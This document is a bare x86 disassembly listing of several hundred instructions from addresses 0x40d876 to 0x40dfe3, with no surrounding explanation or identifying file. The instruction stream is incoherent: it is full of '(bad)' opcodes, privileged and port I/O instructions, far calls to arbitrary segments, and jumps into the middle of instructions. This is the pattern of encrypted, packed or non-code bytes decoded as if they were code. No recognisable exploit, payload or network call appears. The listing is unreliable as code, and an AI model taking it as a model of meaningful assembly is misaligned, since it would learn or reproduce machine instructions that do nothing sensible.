  40d876:	and    eax,0xb1e39b0a
  40d87b:	ss stc 
  40d87d:	mov    cl,0x92
  40d87f:	fisub  WORD PTR [ecx+0x605ade7e]
  40d885:	mov    edi,0x78887ab5
  40d88a:	push   edi
  40d88b:	clc    
  40d88c:	adc    DWORD PTR [ecx-0x1d],0x19
  40d890:	or     ebp,DWORD PTR [eax]
  40d892:	cmp    ecx,esi
  40d894:	jne    0x40d8df
  40d896:	pop    esp
  40d897:	and    BYTE PTR [edx-0x3],ch
  40d89a:	push   ebx
  40d89b:	repz lock push edx
  40d89e:	inc    ecx
  40d89f:	jb     0x40d8dc
  40d8a1:	mov    edi,0x94be1f97
  40d8a6:	push   edx
  40d8a7:	cld    
  40d8a8:	call   0x3a51:0x2e480c52
  40d8af:	rcr    BYTE PTR ds:0x8cfd97ce,cl
  40d8b5:	add    BYTE PTR [esi+0x7],0xc4
  40d8b9:	dec    eax
  40d8ba:	int    0x14
  40d8bc:	lahf   
  40d8bd:	jb     0x40d914
  40d8bf:	rcr    DWORD PTR [edi],0x4b
  40d8c2:	cld    
  40d8c3:	xchg   BYTE PTR [eax-0x28],al
  40d8c6:	jmp    0x394e3da2
  40d8cb:	mov    ecx,0x673be451
  40d8d0:	loope  0x40d909
  40d8d2:	dec    edi
  40d8d3:	and    BYTE PTR [esi],0x89
  40d8d6:	test   DWORD PTR [edi-0x16],ecx
  40d8d9:	dec    ebx
  40d8da:	dec    eax
  40d8db:	fmul   DWORD PTR [eax+esi*1-0x15]
  40d8df:	into   
  40d8e0:	std    
  40d8e1:	push   edx
  40d8e2:	xchg   ebx,eax
  40d8e3:	jg     0x40d8f8
  40d8e5:	mov    ecx,0x8f09c7a
  40d8ea:	jbe    0x40d87b
  40d8ec:	leave  
  40d8ed:	mov    eax,ds:0xdb626f33
  40d8f2:	jle    0x40d950
  40d8f4:	std    
  40d8f5:	retf   0x7fc3
  40d8f8:	sub    eax,0x60f569a2
  40d8fd:	mov    cl,0x71
  40d8ff:	retf   0x4fbe
  40d902:	sti    
  40d903:	adc    al,0x2f
  40d905:	add    BYTE PTR [eax-0x7e65050],dl
  40d90b:	pop    ebp
  40d90c:	cli    
  40d90d:	fnstsw WORD PTR [esi+0x22d9bdf6]
  40d913:	fbstp  TBYTE PTR [ecx]
  40d915:	pop    eax
  40d916:	cmp    ebx,DWORD PTR [ecx]
  40d918:	mov    esi,0xf0122214
  40d91d:	aas    
  40d91e:	addr16 hlt 
  40d920:	ret    
  40d921:	stos   DWORD PTR es:[edi],eax
  40d922:	pop    es
  40d923:	adc    eax,0x684a8b93
  40d928:	and    al,0xa8
  40d92a:	bound  ebp,QWORD PTR [eax+edi*8+0x3c]
  40d92e:	fwait
  40d92f:	add    dh,BYTE PTR [ebx+0x2c5bdb0]
  40d935:	aas    
  40d936:	sbb    ecx,esi
  40d938:	mov    esp,cs
  40d93a:	push   es
  40d93b:	fwait
  40d93c:	push   ds
  40d93d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d93e:	leave  
  40d93f:	dec    ebp
  40d940:	xchg   edi,eax
  40d941:	int3   
  40d942:	mov    ds:0x9b0c80fb,eax
  40d947:	mov    cl,0xf2
  40d949:	(bad)  
  40d94b:	sbb    BYTE PTR [edx-0x9],cl
  40d94e:	xchg   BYTE PTR [eax-0x2e],bl
  40d951:	mov    ch,0x5b
  40d953:	xchg   esi,eax
  40d954:	jb     0x40d9be
  40d956:	ins    DWORD PTR es:[edi],dx
  40d957:	mov    fs,esp
  40d959:	enter  0x6853,0xc7
  40d95d:	imul   esp,DWORD PTR [esi+0x4d],0x3d
  40d961:	retf   
  40d962:	and    ah,BYTE PTR ds:0x258cfa2a
  40d968:	loop   0x40d9ad
  40d96a:	sahf   
  40d96b:	aas    
  40d96c:	push   ecx
  40d96d:	dec    edi
  40d96e:	mov    ecx,0x972620a2
  40d973:	into   
  40d974:	cmp    BYTE PTR [edx],cl
  40d976:	popf   
  40d977:	inc    edx
  40d978:	and    dh,ch
  40d97a:	add    BYTE PTR [edi+0x43],cl
  40d97d:	test   DWORD PTR [ecx],0x104052d0
  40d983:	and    al,0xd4
  40d985:	in     eax,dx
  40d986:	cli    
  40d987:	inc    ebp
  40d988:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d989:	xchg   DWORD PTR [edx-0x5e],ebx
  40d98c:	and    al,BYTE PTR [edi]
  40d98e:	fsubr  DWORD PTR [edi]
  40d990:	push   esp
  40d991:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d992:	pop    edi
  40d993:	mov    DWORD PTR [eax+0x4eaa99d0],ecx
  40d999:	add    al,0xe7
  40d99b:	out    0x9f,al
  40d99d:	sub    ebp,esp
  40d99f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9a0:	popf   
  40d9a1:	jns    0x40d9db
  40d9a3:	jno    0x40da14
  40d9a5:	fmul   QWORD PTR [ebx]
  40d9a7:	hlt    
  40d9a8:	pop    esi
  40d9a9:	outs   dx,BYTE PTR ds:[esi]
  40d9aa:	mov    edx,0x3074505f
  40d9af:	dec    eax
  40d9b0:	(bad)  
  40d9b1:	or     BYTE PTR [ebp+0x68],ah
  40d9b4:	pop    ds
  40d9b5:	pop    ss
  40d9b6:	xor    ah,al
  40d9b8:	fisubr DWORD PTR [edi+edx*1+0xb90ce65]
  40d9bf:	mov    ebp,DWORD PTR [esi-0x54]
  40d9c2:	inc    edi
  40d9c3:	repnz icebp 
  40d9c5:	psubb  mm5,mm6
  40d9c8:	jae    0x40d9fd
  40d9ca:	adc    bh,BYTE PTR [edi-0x57e696c1]
  40d9d0:	je     0x40d9a7
  40d9d2:	stos   DWORD PTR es:[edi],eax
  40d9d3:	ins    DWORD PTR es:[edi],dx
  40d9d4:	fs (bad) 
  40d9d6:	sbb    DWORD PTR [ebp+0x2],esp
  40d9d9:	or     eax,0xcb492c10
  40d9de:	out    dx,al
  40d9df:	rcl    BYTE PTR [ebx+0x2ade4de0],1
  40d9e5:	push   0x1bf1aa68
  40d9ea:	lock jno 0x40da3a
  40d9ed:	in     eax,dx
  40d9ee:	mov    dl,0xf3
  40d9f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9f1:	adc    DWORD PTR [eax],edx
  40d9f3:	mov    esp,0x32ec817
  40d9f8:	outs   dx,DWORD PTR ds:[esi]
  40d9f9:	ds inc ebx
  40d9fb:	sbb    ch,ah
  40d9fd:	paddb  mm4,QWORD PTR [edi+0x40a4d6]
  40da04:	dec    edx
  40da05:	mov    esi,0xf8b71ddb
  40da0a:	cmp    eax,0xf249da2c
  40da0f:	xlat   BYTE PTR ds:[ebx]
  40da10:	addr16 aas 
  40da12:	arpl   WORD PTR ss:[ecx+0x2a],bp
  40da16:	(bad)  
  40da17:	pop    esi
  40da18:	push   edi
  40da19:	mov    edx,0x48a8d57d
  40da1e:	(bad)  [eax]
  40da20:	mov    ch,0xa0
  40da22:	ret    0x7212
  40da25:	aas    
  40da26:	lock ja 0x40d9de
  40da29:	fs fs xchg esp,eax
  40da2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da2d:	cs jle 0x40da42
  40da30:	imul   ebp,esp,0x7066d704
  40da36:	inc    esp
  40da37:	dec    eax
  40da38:	mov    dh,0x2f
  40da3a:	cwde   
  40da3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da3c:	add    edi,DWORD PTR [ecx-0x184f944e]
  40da42:	adc    dl,BYTE PTR [ebx]
  40da44:	xchg   ecx,eax
  40da45:	push   eax
  40da46:	(bad)  
  40da47:	mov    bh,0xc6
  40da49:	call   ebx
  40da4b:	jb     0x40d9eb
  40da4d:	inc    eax
  40da4e:	loop   0x40da08
  40da50:	mov    al,ds:0x9482c819
  40da55:	push   edx
  40da56:	sbb    ch,bl
  40da58:	int3   
  40da59:	pop    edi
  40da5a:	repnz xor al,BYTE PTR [edi]
  40da5d:	adc    al,0xe5
  40da5f:	add    bl,BYTE PTR [eax+0x33]
  40da62:	sub    DWORD PTR [esi-0x303b89dd],ebp
  40da68:	call   0x2b466147
  40da6d:	fisttp WORD PTR [ebx+ebp*1+0x48]
  40da71:	push   edx
  40da72:	add    ah,ah
  40da74:	sysexit 
  40da76:	add    al,bh
  40da78:	pop    es
  40da79:	inc    ebx
  40da7a:	fild   WORD PTR [ebp-0x37a235d8]
  40da80:	enter  0xa791,0x8c
  40da84:	jne    0x40db01
  40da86:	aas    
  40da87:	in     eax,0xf0
  40da89:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da8b:	mov    bl,0x60
  40da8d:	ret    0x542c
  40da90:	fistp  DWORD PTR [esi+0x4edde972]
  40da97:	adc    eax,0x28d2f430
  40da9c:	pop    esp
  40da9d:	and    al,0x3b
  40da9f:	mov    esp,0xfd1d8cf7
  40daa4:	cmp    edx,ebp
  40daa6:	xchg   BYTE PTR [ecx-0x2e],cl
  40daa9:	aam    0x77
  40daab:	xchg   esp,eax
  40daac:	aam    0x56
  40daae:	jae    0x40da76
  40dab0:	ret    
  40dab1:	xor    al,BYTE PTR [eax-0x52]
  40dab4:	fld    st(3)
  40dab6:	mov    WORD PTR ds:0xe153e8b3,?
  40dabc:	inc    edx
  40dabd:	sub    ebp,DWORD PTR [edi+0x48cbdcb9]
  40dac3:	je     0x40dafc
  40dac5:	dec    ecx
  40dac6:	jmp    0x40da87
  40dac8:	xlat   BYTE PTR ds:[ebx]
  40dac9:	sti    
  40daca:	add    ecx,DWORD PTR [esi]
  40dacc:	adc    al,0xd3
  40dace:	outs   dx,DWORD PTR ds:[esi]
  40dacf:	xor    BYTE PTR [edi],dl
  40dad1:	dec    ebx
  40dad2:	adc    DWORD PTR [eax],eax
  40dad4:	jbe    0x40db38
  40dad6:	data16 xor al,0x1c
  40dad9:	xchg   DWORD PTR [ecx-0x585704da],edi
  40dadf:	or     BYTE PTR [ebx],0x61
  40dae2:	pop    ds
  40dae3:	imul   eax,DWORD PTR [ebx+0x395566cd],0x49
  40daea:	scas   eax,DWORD PTR es:[edi]
  40daeb:	xor    esp,esi
  40daed:	in     eax,0x42
  40daef:	xchg   DWORD PTR [eax+eax*1-0x79019619],edi
  40daf6:	fadd   st(4),st
  40daf8:	(bad)  
  40daf9:	lahf   
  40dafa:	imul   ebx,DWORD PTR [eax+ebp*4+0x6c],0x54
  40daff:	add    BYTE PTR [edi],ch
  40db01:	pushf  
  40db02:	imul   DWORD PTR [eax+0x31]
  40db05:	aas    
  40db06:	test   al,0x20
  40db08:	pop    ebx
  40db09:	sub    dh,al
  40db0b:	mov    ch,0xb3
  40db0d:	in     al,0x9d
  40db0f:	int3   
  40db10:	je     0x40dac7
  40db12:	dec    edx
  40db13:	add    ch,BYTE PTR [ecx-0x1961b73b]
  40db19:	fimul  DWORD PTR [ebp-0x22f9a58b]
  40db1f:	jl     0x40dac6
  40db21:	mov    al,ds:0xab3aa4e0
  40db26:	rol    BYTE PTR [ebx-0x5f57fb9a],1
  40db2c:	mov    dl,0x26
  40db2e:	in     al,0x9c
  40db30:	pop    ebp
  40db31:	enter  0xdf71,0x6c
  40db35:	pop    ds
  40db36:	loopne 0x40db77
  40db38:	mov    ecx,0x4896beb4
  40db3d:	pop    edx
  40db3e:	sbb    bh,BYTE PTR [eax+0x4d]
  40db41:	ror    cl,1
  40db43:	call   DWORD PTR [esi+0x75b3096c]
  40db49:	bound  esi,QWORD PTR [edx]
  40db4b:	jmp    0xd163:0x35b2dbfa
  40db52:	(bad)  
  40db55:	(bad)  
  40db56:	cli    
  40db57:	test   DWORD PTR [esi+ecx*2],0xbae688fa
  40db5e:	mov    edi,0x648a451
  40db63:	das    
  40db64:	lds    ebp,FWORD PTR gs:[eax+eiz*8+0x6c]
  40db69:	push   ebx
  40db6a:	mov    DWORD PTR [esi],edi
  40db6c:	popf   
  40db6d:	mov    al,ds:0xd983f60b
  40db72:	fs cli 
  40db74:	jns    0x40db25
  40db76:	or     edi,ebx
  40db78:	sub    dh,al
  40db7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db7b:	clc    
  40db7c:	rcl    DWORD PTR [ecx+0x4c],0x94
  40db80:	sar    DWORD PTR [eax],0x1b
  40db83:	inc    esp
  40db84:	mov    esi,0x1c6b0501
  40db89:	das    
  40db8a:	ret    0xf005
  40db8d:	fiadd  WORD PTR [eax]
  40db8f:	mov    dl,0x47
  40db91:	rol    DWORD PTR [edx-0x5c9a7eff],cl
  40db97:	or     esi,eax
  40db99:	pop    esi
  40db9a:	push   0x3b
  40db9c:	call   0x169a:0x261d2a52
  40dba3:	pop    ds
  40dba4:	adc    DWORD PTR [edx],esi
  40dba6:	cmp    ebx,DWORD PTR [ecx-0x27]
  40dba9:	pop    ebx
  40dbaa:	cmc    
  40dbab:	add    DWORD PTR [ebx+0x3f],edx
  40dbae:	dec    BYTE PTR [edx+0x43]
  40dbb1:	sbb    edi,edi
  40dbb3:	shl    ebx,cl
  40dbb5:	pop    es
  40dbb6:	data16 int3 
  40dbb8:	push   es
  40dbb9:	stos   BYTE PTR es:[edi],al
  40dbba:	(bad)  
  40dbbc:	test   eax,0x1ce6c33b
  40dbc1:	aam    0xd8
  40dbc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbc4:	adc    DWORD PTR [ebp-0x5e],edx
  40dbc7:	mov    bh,BYTE PTR [eax+0x6fd019fc]
  40dbcd:	dec    edx
  40dbce:	fistp  WORD PTR [edx-0x6]
  40dbd1:	jmp    0xff8de3fe
  40dbd6:	daa    
  40dbd7:	adc    al,0xa7
  40dbd9:	xor    ecx,DWORD PTR [edx+0x64]
  40dbdc:	jnp    0x40db98
  40dbde:	add    ch,0xdf
  40dbe1:	xchg   edx,eax
  40dbe2:	sbb    al,ah
  40dbe4:	xor    eax,0x34ed1cea
  40dbe9:	lods   al,BYTE PTR ds:[esi]
  40dbea:	push   eax
  40dbeb:	(bad)  
  40dbec:	xchg   ebx,eax
  40dbed:	and    eax,0x91a928d9
  40dbf2:	fiadd  DWORD PTR [esi+0x61]
  40dbf5:	dec    esi
  40dbf6:	div    edx
  40dbf8:	mov    ds:0x795eefe3,eax
  40dbfd:	mov    al,0xa2
  40dbff:	inc    ebp
  40dc00:	mov    DWORD PTR [eax+0xc2df055],ecx
  40dc06:	pop    edi
  40dc07:	gs ss add eax,0x1d249344
  40dc0e:	pushf  
  40dc0f:	mov    edx,0xcf2d0b9c
  40dc14:	(bad)  
  40dc15:	dec    ecx
  40dc16:	out    0xe1,eax
  40dc18:	fisttp QWORD PTR [edx-0x7617812b]
  40dc1e:	hlt    
  40dc1f:	push   ebx
  40dc20:	stc    
  40dc21:	jbe    0x40dc0b
  40dc23:	aad    0xf8
  40dc25:	fstp   QWORD PTR [edi-0x15]
  40dc28:	int3   
  40dc29:	lock in eax,0x75
  40dc2c:	jns    0x40dbdf
  40dc2e:	mov    edx,0x79ab326a
  40dc33:	adc    BYTE PTR [eax],bh
  40dc35:	std    
  40dc36:	xlat   BYTE PTR ds:[ebx]
  40dc37:	dec    ebx
  40dc38:	jo     0x40dbf8
  40dc3a:	xchg   ebx,eax
  40dc3b:	xchg   ecx,eax
  40dc3c:	inc    ecx
  40dc3d:	sar    al,1
  40dc3f:	mov    ah,0xb9
  40dc41:	popa   
  40dc42:	dec    esi
  40dc43:	shr    DWORD PTR [ebx-0x12f1fdc5],0x7a
  40dc4a:	shr    DWORD PTR ds:0xdff1ac03,1
  40dc50:	mov    edi,0x25e39d06
  40dc55:	pushf  
  40dc56:	aas    
  40dc57:	stos   BYTE PTR es:[edi],al
  40dc58:	es cmp eax,0x197c78a5
  40dc5e:	(bad)  [ecx]
  40dc60:	loopne 0x40dca3
  40dc62:	lods   al,BYTE PTR fs:[esi]
  40dc64:	push   esi
  40dc65:	xchg   esp,eax
  40dc66:	jg     0x6ba2eef6
  40dc6c:	fld    DWORD PTR [eax+0x70b8a7fb]
  40dc72:	jge    0x40dcc6
  40dc74:	sub    eax,0x85dfea04
  40dc79:	clc    
  40dc7a:	out    dx,eax
  40dc7b:	sbb    eax,DWORD PTR [ebx]
  40dc7d:	pop    ebx
  40dc7e:	jg     0x40dccf
  40dc80:	iret   
  40dc81:	or     DWORD PTR [ebp+0x29],esi
  40dc84:	fdiv   st(2),st
  40dc86:	ins    BYTE PTR es:[edi],dx
  40dc87:	push   esi
  40dc88:	test   al,0xb8
  40dc8a:	push   eax
  40dc8b:	dec    ebx
  40dc8c:	sti    
  40dc8d:	mov    cs,WORD PTR ds:0xa0644c67
  40dc93:	cmp    edi,DWORD PTR [ebx+0x280d5be6]
  40dc99:	and    ebp,DWORD PTR [eax]
  40dc9b:	add    bl,bh
  40dc9d:	cmp    BYTE PTR [esi],ah
  40dc9f:	outs   dx,BYTE PTR ds:[esi]
  40dca0:	mov    cl,0xbb
  40dca2:	xor    ah,BYTE PTR [ebx]
  40dca4:	add    eax,0x3b6e68ef
  40dca9:	pop    edi
  40dcaa:	mov    cl,0x45
  40dcac:	xchg   ebx,eax
  40dcad:	imul   ecx,esp,0xffffff98
  40dcb0:	repz pop es
  40dcb2:	inc    edi
  40dcb3:	enter  0x14ed,0xbb
  40dcb7:	ins    DWORD PTR es:[edi],dx
  40dcb8:	aas    
  40dcb9:	outs   dx,DWORD PTR ds:[esi]
  40dcba:	sub    esp,DWORD PTR [ebp-0x69e734a6]
  40dcc0:	fwait
  40dcc1:	stc    
  40dcc2:	shl    BYTE PTR [esi+0x2d496983],0x83
  40dcc9:	sti    
  40dcca:	out    dx,al
  40dccb:	jg     0x40dd02
  40dccd:	mov    ecx,DWORD PTR [edx-0x21b74345]
  40dcd3:	repnz retf 
  40dcd5:	push   esp
  40dcd6:	cld    
  40dcd7:	sar    DWORD PTR [edx-0x4d],1
  40dcda:	rcl    DWORD PTR [eax],0x3a
  40dcdd:	add    BYTE PTR [ebx-0x50e2e1f5],0x43
  40dce4:	add    DWORD PTR [ecx+edi*4],edx
  40dce7:	out    0x4a,eax
  40dce9:	inc    esi
  40dcea:	cwde   
  40dceb:	mov    bl,0xb7
  40dced:	sti    
  40dcee:	inc    esi
  40dcef:	test   bl,ch
  40dcf1:	pop    esi
  40dcf2:	xchg   BYTE PTR [ecx+0x66],al
  40dcf5:	retf   0xf846
  40dcf8:	ins    DWORD PTR es:[edi],dx
  40dcf9:	xor    DWORD PTR [eax],edx
  40dcfb:	jns    0x40dcd9
  40dcfd:	pop    ecx
  40dcfe:	lods   eax,DWORD PTR ds:[esi]
  40dcff:	sub    al,0x22
  40dd01:	jbe    0x40dc92
  40dd03:	xor    eax,0xe800a14a
  40dd08:	out    dx,al
  40dd09:	push   ebx
  40dd0a:	jnp    0x40dcba
  40dd0c:	add    ebx,edx
  40dd0e:	xor    al,0xa6
  40dd10:	(bad)  
  40dd11:	sbb    al,0x35
  40dd13:	mov    ebx,0x8e51788b
  40dd18:	shl    DWORD PTR [edi+0x63525816],1
  40dd1e:	mov    BYTE PTR [ebx+edx*8-0x6b],bh
  40dd22:	sub    edi,DWORD PTR [esi+0x4d]
  40dd25:	mov    DWORD PTR [esi],edx
  40dd27:	lock sbb esp,eax
  40dd2a:	push   0xffffffb1
  40dd2c:	push   edi
  40dd2d:	es pushf 
  40dd2f:	mov    ch,0x51
  40dd31:	dec    ecx
  40dd32:	nop
  40dd33:	sbb    ecx,DWORD PTR [eax+eiz*8-0x4]
  40dd37:	mov    BYTE PTR [edi],dh
  40dd39:	outs   dx,BYTE PTR ds:[esi]
  40dd3a:	push   ss
  40dd3b:	inc    edx
  40dd3c:	pop    ecx
  40dd3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd3e:	inc    esi
  40dd3f:	or     esi,DWORD PTR [ebx]
  40dd41:	jb     0x40dd43
  40dd43:	xchg   BYTE PTR [edi+0xcec75a],dl
  40dd49:	inc    ebx
  40dd4a:	mov    esi,0xa99fe924
  40dd4f:	repnz add eax,0x739088f5
  40dd55:	jns    0x40ddc0
  40dd57:	xchg   edx,eax
  40dd58:	dec    ecx
  40dd59:	xor    al,0xe5
  40dd5b:	stos   DWORD PTR es:[edi],eax
  40dd5c:	xor    eax,0x46ba6c0c
  40dd61:	add    DWORD PTR [eax-0x13bb5774],edx
  40dd67:	adc    dl,ah
  40dd69:	jbe    0x40ddc9
  40dd6b:	shr    BYTE PTR [edi+ecx*4+0xb],cl
  40dd6f:	fs jge 0x40ddaa
  40dd72:	in     eax,dx
  40dd73:	push   es
  40dd74:	pop    es
  40dd75:	adc    eax,0x2c4b3a4f
  40dd7a:	xor    eax,0xbe913d80
  40dd7f:	inc    edi
  40dd80:	in     eax,0x88
  40dd82:	ins    BYTE PTR es:[edi],dx
  40dd83:	add    al,0xf1
  40dd85:	ret    
  40dd86:	mov    eax,0x70d5b784
  40dd8b:	sub    al,0x14
  40dd8d:	mov    ebx,0xa270c4f2
  40dd92:	emms   
  40dd94:	cmp    ebx,DWORD PTR [ebp+0x648f044e]
  40dd9a:	test   edx,ebp
  40dd9c:	push   esp
  40dd9d:	sbb    BYTE PTR ds:[esi+0x6b8778df],cl
  40dda4:	ds push edi
  40dda6:	cmp    eax,DWORD PTR [eax-0x35a950c8]
  40ddac:	sub    esp,DWORD PTR [ebx]
  40ddae:	ror    DWORD PTR [esi],1
  40ddb0:	push   edx
  40ddb1:	jmp    0x40de1c
  40ddb3:	xchg   DWORD PTR [ebp-0x57],esp
  40ddb6:	arpl   WORD PTR [edi-0x426ad44c],bp
  40ddbc:	repnz lods eax,DWORD PTR ds:[esi]
  40ddbe:	ss out 0x77,eax
  40ddc1:	adc    DWORD PTR [edx+0x52],edi
  40ddc4:	sub    ah,0x12
  40ddc7:	sub    bh,bh
  40ddc9:	popa   
  40ddca:	cmp    esi,DWORD PTR [ebp-0x2]
  40ddcd:	and    eax,0xf8052d48
  40ddd2:	ret    0x52c8
  40ddd5:	mov    ebp,0xfec466de
  40ddda:	dec    ecx
  40dddb:	adc    edi,ebx
  40dddd:	mov    cl,0x81
  40dddf:	pop    ecx
  40dde0:	rcr    DWORD PTR [edx+0x32a5d365],1
  40dde6:	dec    edi
  40dde7:	lods   al,BYTE PTR ds:[esi]
  40dde8:	jnp    0x40dda8
  40ddea:	scas   al,BYTE PTR es:[edi]
  40ddeb:	in     al,0xfb
  40dded:	sub    BYTE PTR [edx],0x25
  40ddf0:	add    eax,0xf35c3c57
  40ddf5:	cmp    ecx,DWORD PTR [edi]
  40ddf7:	outs   dx,BYTE PTR ds:[esi]
  40ddf8:	or     al,0x5f
  40ddfa:	(bad)  
  40ddfb:	aam    0x8
  40ddfd:	push   esi
  40ddfe:	popf   
  40ddff:	push   0xee075a65
  40de04:	stos   DWORD PTR es:[edi],eax
  40de05:	es loopne 0x40de15
  40de08:	cmova  edx,DWORD PTR [eax-0xf968239]
  40de0f:	bound  ebp,QWORD PTR [eax-0x39]
  40de12:	or     eax,0xf6b6fe0c
  40de17:	out    dx,eax
  40de18:	cwde   
  40de19:	(bad)  
  40de1a:	push   ebx
  40de1b:	imul   ecx,DWORD PTR [ebp+ebx*1-0x1b],0xffffff88
  40de20:	in     eax,0x66
  40de22:	xchg   ecx,eax
  40de23:	imul   edx,DWORD PTR [ebp+eax*2+0x23790f9e],0xffa72331
  40de2e:	call   DWORD PTR [ecx]
  40de30:	xor    DWORD PTR [edx-0x28],eax
  40de33:	(bad)  
  40de34:	jno    0x40ddba
  40de36:	cmp    BYTE PTR [esi+eiz*4+0x25],ah
  40de3a:	lock push ds
  40de3c:	push   edi
  40de3d:	nop
  40de3e:	cld    
  40de3f:	popf   
  40de40:	or     BYTE PTR [esi+edi*1+0x56283b81],al
  40de47:	sub    bl,BYTE PTR [ebx+edx*2]
  40de4a:	inc    ecx
  40de4b:	inc    esi
  40de4c:	fcom   QWORD PTR [edx+0x695fab8e]
  40de52:	push   0x29
  40de54:	or     bl,BYTE PTR [esi+0x54]
  40de57:	jp     0x40de2b
  40de59:	xchg   edi,eax
  40de5a:	push   ebx
  40de5b:	pop    ecx
  40de5c:	jp     0x40de86
  40de5e:	sub    BYTE PTR [ebx+0x13],bh
  40de61:	adc    dl,BYTE PTR [eax+edi*4+0x18dc57b1]
  40de68:	jne    0x40de52
  40de6a:	aaa    
  40de6b:	loopne 0x40deea
  40de6d:	adc    DWORD PTR [ebp-0x50],esp
  40de70:	xchg   edi,eax
  40de71:	adc    BYTE PTR [edi-0x2cce6e76],0x34
  40de78:	jae    0x40def1
  40de7a:	pop    esp
  40de7b:	fadd   DWORD PTR [ebx]
  40de7d:	jb     0x40de02
  40de7f:	and    al,0x1a
  40de81:	in     eax,0x5c
  40de83:	int    0x37
  40de85:	or     eax,0x91652cc5
  40de8a:	or     BYTE PTR [eax-0x3b2d5631],ah
  40de90:	in     al,0x47
  40de92:	dec    esi
  40de93:	ficomp DWORD PTR gs:[esi-0x1a41a394]
  40de9a:	push   edi
  40de9b:	shl    DWORD PTR [eax+0x1d],cl
  40de9e:	xor    bh,dl
  40dea0:	les    edx,FWORD PTR [ebp+0x11]
  40dea3:	out    dx,al
  40dea4:	es push ebx
  40dea6:	ror    DWORD PTR [edi],1
  40dea8:	inc    esi
  40dea9:	xchg   ebx,eax
  40deaa:	repz cwde 
  40deac:	pop    esi
  40dead:	mov    eax,ds:0x2579c537
  40deb2:	and    esp,eax
  40deb4:	neg    DWORD PTR [ebp+ebx*2+0x29]
  40deb8:	sub    DWORD PTR [ecx-0x5d909f9e],edx
  40debe:	sar    BYTE PTR [ebp-0xe534e69],0xb4
  40dec5:	pop    esi
  40dec6:	xchg   edx,eax
  40dec7:	xchg   BYTE PTR [ebx-0x37bfb892],cl
  40decd:	pop    es
  40dece:	std    
  40decf:	aad    0xb4
  40ded1:	(bad)  
  40ded2:	je     0x40df25
  40ded4:	(bad)
  40ded9:	or     BYTE PTR [ebp+eiz*8-0x67],cl
  40dedd:	into   
  40dede:	or     DWORD PTR [edi+0x3859dd63],ebp
  40dee4:	and    BYTE PTR [ebx-0x3f0fe42f],dl
  40deea:	sar    DWORD PTR [esi-0x1a3c195f],0xc0
  40def1:	dec    ebx
  40def2:	and    al,0x17
  40def4:	rcr    BYTE PTR [ebp-0x39],1
  40def7:	cmc    
  40def8:	and    ch,BYTE PTR [ebx-0x46f82be]
  40defe:	ja     0x40df43
  40df00:	xor    eax,0x7c1ab96d
  40df05:	pop    ds
  40df06:	mov    WORD PTR ds:0x3a3c142a,gs
  40df0c:	jecxz  0x40df21
  40df0e:	push   ebx
  40df0f:	test   al,0x32
  40df11:	push   es
  40df12:	mov    dh,BYTE PTR ds:0x28fbedf7
  40df18:	xchg   DWORD PTR [eax+0x7169903],edi
  40df1e:	jo     0x40df81
  40df20:	dec    ebx
  40df21:	scas   eax,DWORD PTR es:[edi]
  40df22:	or     cl,BYTE PTR [ecx+0x63]
  40df25:	xchg   DWORD PTR [esi],ebp
  40df27:	je     0x40df0e
  40df29:	(bad)  
  40df2a:	rcr    DWORD PTR [esi-0x5430fead],cl
  40df30:	fcmovnbe st,st(0)
  40df32:	sbb    al,0xd8
  40df34:	sub    esi,esi
  40df36:	imul   ebp,ebx,0xe3688458
  40df3c:	push   ds
  40df3d:	pop    ecx
  40df3e:	sub    DWORD PTR es:[edx+0x5d],esp
  40df42:	push   ds
  40df43:	sahf   
  40df44:	test   eax,0x36912d2b
  40df49:	repz hlt 
  40df4b:	test   eax,0xa631e489
  40df50:	mov    dl,0x38
  40df52:	xchg   esi,eax
  40df53:	dec    edx
  40df54:	sar    DWORD PTR [edi+eiz*1-0x3d],cl
  40df58:	mov    edi,0x35eabbc3
  40df5d:	mov    al,0x9
  40df5f:	bound  edi,QWORD PTR cs:[esp+edi*4-0x5c53e42b]
  40df67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df68:	dec    eax
  40df69:	retf   0x640e
  40df6c:	add    dh,0x38
  40df6f:	cmp    ch,ch
  40df71:	dec    eax
  40df72:	stos   DWORD PTR es:[edi],eax
  40df73:	ds iret 
  40df75:	sub    al,0xf4
  40df77:	cld    
  40df78:	adc    al,0xfd
  40df7a:	inc    ecx
  40df7b:	or     eax,0xc6e23897
  40df80:	dec    ecx
  40df81:	ja     0x40df6c
  40df83:	ins    BYTE PTR es:[edi],dx
  40df84:	adc    al,0x51
  40df86:	push   ebx
  40df87:	in     eax,0xc
  40df89:	mov    ds:0xb5709336,al
  40df8e:	(bad)  
  40df8f:	jecxz  0x40dfbd
  40df91:	mov    esi,0x1f677a48
  40df96:	pusha  
  40df97:	int3   
  40df98:	inc    eax
  40df99:	mov    ds:0x2b726e8d,al
  40df9e:	fdivr  DWORD PTR [ebp-0x35]
  40dfa1:	dec    esi
  40dfa2:	mov    esp,0x6f183b47
  40dfa7:	pop    edx
  40dfa8:	mov    dx,0x3d62
  40dfac:	push   0x1f
  40dfae:	pop    DWORD PTR [edi-0x7ddbf0d2]
  40dfb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfb5:	mov    esp,0x5196a1eb
  40dfba:	xchg   BYTE PTR [ecx-0x69],dl
  40dfbd:	xchg   esi,eax
  40dfbe:	in     eax,dx
  40dfbf:	push   0x30630938
  40dfc4:	push   cs
  40dfc5:	jge    0x40e024
  40dfc7:	push   eax
  40dfc8:	xor    al,0x4a
  40dfca:	xor    ebx,DWORD PTR [esi+0x6daacc63]
  40dfd0:	cmp    eax,0x159a843f
  40dfd5:	jb     0x40df5e
  40dfd7:	or     al,0xc
  40dfd9:	pop    ebp
  40dfda:	sbb    BYTE PTR [esp+eiz*2-0x50187a1a],ah
  40dfe1:	dec    eax
  40dfe2:	cwde   
  40dfe3:	or     dh,dl
